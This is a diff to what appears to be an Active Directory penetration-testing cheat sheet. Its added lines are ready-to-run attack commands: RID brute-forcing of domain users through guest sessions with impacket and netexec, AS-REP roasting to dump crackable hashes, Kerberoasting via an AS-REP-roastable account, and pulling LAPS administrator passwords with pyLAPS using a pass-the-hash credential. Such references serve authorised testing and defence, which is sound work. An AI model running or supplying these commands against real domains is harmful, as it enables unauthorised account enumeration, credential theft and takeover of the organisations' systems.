@@ -36,6 +36,10 @@ crackmapexec smb ip -u user -p pass -M gpp_autologin
 ```bash
 # Tool https://gist.github.com/superkojiman/11076951
 python3 namemash.py >> usernames.txt
+# RID Brute
+impacket-lookupsid -no-pass 'guest@domain.com' 20000
+impacket-lookupsid -no-pass 'guest@domain.com' <8000> | grep SidTypeUser | cut -d' ' -f2 | cut -d'\' -f2 | tee users
+netexec smb DCIP -u guest -p '' --rid-brute
 ```
 
 ### Null session
@@ -144,6 +148,7 @@ crackmapexec smb $ip -u users.txt -p users.txt --no-bruteforce
 
 ```bash
 impacket-GetNPUsers domain.com/ -request -format hashcat -dc-ip $ip -usersfile users.txt
+netexec ldap DCIP -u users -p '' --asreproast asrephashes.txt
 ```
 #### Windows
 
@@ -206,6 +211,12 @@ $assem = [System.Reflection.Assembly]::Load($data)
 GetUserSPNs.py -request -dc-ip <DCIP> domain.com/username -outputfile hashes.kerberoast
 GetUserSPNs.py -request -dc-ip <DCIP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
 crackmapexec ldap $ip -u username -p 'password' -d domain.com --kerberoasting KERBEROASTING
+```
+
+#### Kerberoasting over ASREPROAST
+
+```bash
+GetUserSPNs.py -no-preauth <user asreproasting> -usersfile users -dc-host <IP DC> domain.com/
 ```
 
 ### ADCS
@@ -271,6 +282,16 @@ crackmapexec ldap ip -u username -p password -d domain.com -M MAQ
 python3 dnstool.py -u 'domain.com\username' -p 'password' --record '*' --action query DCIP
 adidnsdump -u 'domain.com\username' -p 'password' pc.domain.com
 ```
+
+### LAPS
+
+- https://github.com/p0dalirius/pyLAPS
+- https://github.com/swisskyrepo/SharpLAPS
+
+```bash
+python3 pyLAPS.py --action get -u iamtheadministrator -H 70016778cb0524c799ac25b439bd67e0 -d corp.local --dc-ip 172.16.1.5
+```
+
 
 ### Coerce
 
